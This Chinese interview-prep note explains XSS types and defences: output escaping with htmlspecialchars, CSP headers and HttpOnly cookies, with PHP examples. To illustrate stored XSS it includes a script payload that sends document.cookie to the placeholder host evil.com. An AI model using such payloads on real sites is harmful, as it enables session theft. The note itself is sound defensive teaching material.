---
title: XSS 攻击类型与防御方案
difficulty: L1
frequency: 高
tags: [安全, XSS, CSP, htmlspecialchars, PHP]
needs_verification: false
created: 2026-05-04
---

# [L1] XSS 攻击类型与防御方案

#### 一句话结论

> XSS 分反射型、存储型、DOM 型，防御核心是 htmlspecialchars 转义与 CSP 策略。

---

#### 体系讲解

**1. XSS 三种类型对照**

| 类型 | 攻击载体位置 | 触发条件 | 危害程度 |
|---|---|---|---|
| **反射型**（非持久） | URL 参数 | 用户点击构造的恶意链接 | 中（需诱导点击） |
| **存储型**（持久） | 数据库 | 所有访问该页面的用户自动触发 | 高（无需诱导） |
| **DOM 型** | 客户端 JS 逻辑 | JS 读取 URL/输入直接写入 DOM | 中（服务端无感知） |

**2. 各类型攻击原理**

- **反射型**：攻击者构造 `https://example.com/search?q=<script>alert(1)</script>`，服务端直接将参数值输出到 HTML，用户访问链接即触发
- **存储型**：攻击者在评论框提交 `<script>document.location='https://evil.com?c='+document.cookie</script>`，存入数据库后，每个读取该评论的用户都受害
- **DOM 型**：JS 从 `location.hash` 或 `document.URL` 读取数据后直接用 `innerHTML` 写入，全程不经服务端，传统 WAF 无法拦截

**3. 防御手段**

| 手段 | 说明 | 适用场景 |
|---|---|---|
| **输出转义** | `htmlspecialchars()` 将 `<>&"'` 转为 HTML 实体 | 服务端渲染时所有输出 |
| **CSP** | `Content-Security-Policy` 响应头限制脚本来源 | 全局防御，减少 XSS 实际危害 |
| **HttpOnly Cookie** | 禁止 JS 读取 Cookie，阻断信息窃取 | 会话 Cookie 必须开启 |
| **输入验证** | 拒绝非法字符（辅助手段，不能替代输出转义） | 结合业务规则使用 |
| **DOM 安全 API** | 用 `textContent` 代替 `innerHTML` | 客户端 JS 渲染 |

**4. CSP 策略示例**

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com; object-src 'none'
```

- `default-src 'self'`：默认只允许同源资源
- `script-src 'self' https://trusted.cdn.com`：只允许同源脚本和指定 CDN
- `object-src 'none'`：禁止 Flash 等插件（常见 XSS 利用路径）

---

#### 考察意图

考察候选人对 XSS 攻击面的全面认知——能否区分三种类型的触发机制，以及是否掌握「输出转义 + CSP + HttpOnly」的防御纵深思路，而非只知道 `htmlspecialchars` 一个函数。

---

#### 追问链

1. **为什么说「输入过滤」不能替代「输出转义」？**  
   输入过滤针对特定规则，可能被绕过（如 Unicode 编码、宽字节注入）；而且同一份数据可能被用在 HTML、JS、SQL 等不同上下文，每种上下文的危险字符不同。输出时按照目标上下文做转义才是根本——HTML 上下文用 `htmlspecialchars`，JS 上下文用 `json_encode`，SQL 用参数绑定。

2. **DOM 型 XSS 为什么 WAF 无法拦截？**  
   DOM 型 XSS 的恶意代码在客户端 JS 执行时才发生，攻击载体通常在 URL Hash（`#` 后面的内容不发送到服务端）或本地存储，HTTP 请求中没有恶意内容，服务端和 WAF 都无从检测。防御需在前端代码中避免将不可信数据直接写入 `innerHTML`/`document.write`。

3. **`htmlspecialchars` 的 `ENT_QUOTES` 参数有什么作用？**  
   默认 `htmlspecialchars` 只转义双引号，不转义单引号。若输出在单引号属性中（如 `<input value='$data'>`），不转义单引号会导致 XSS。应始终传入 `ENT_QUOTES | ENT_SUBSTITUTE`（PHP 8.1+），同时转义单双引号并替换无效字符序列。

---

#### 易错点

1. **只做输入过滤，不做输出转义**：相信「过滤了就安全」，但过滤可被绕过，且富文本场景（允许部分 HTML）无法全量过滤。输出时按上下文转义才是正解。

2. **`htmlspecialchars` 漏传字符集参数**：在多字节编码（GBK）环境下，漏传 `charset` 可能导致宽字节注入绕过转义。应显式传入 `htmlspecialchars($str, ENT_QUOTES, 'UTF-8')`，并确保页面声明 UTF-8。

3. **CSP 配置了 `unsafe-inline`**：`script-src 'unsafe-inline'` 允许页面内联脚本，完全绕开 CSP 对 XSS 的防护效果——这是最常见的 CSP 错误配置，等于 CSP 形同虚设。

---

#### 代码示例

```php
// ✅ 正确：输出时转义，显式指定字符集
echo htmlspecialchars($userInput, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');

// ✅ 在 HTTP 响应头设置 CSP（框架中间件或 Nginx 配置）
header("Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'");

// ✅ 设置 HttpOnly Cookie，阻断 JS 读取
setcookie('session_id', $sessionId, [
    'httponly' => true,
    'secure'   => true,
    'samesite' => 'Strict',
]);

// ❌ 反例：直接输出用户输入（存储型 XSS 温床）
// echo $userComment;
```
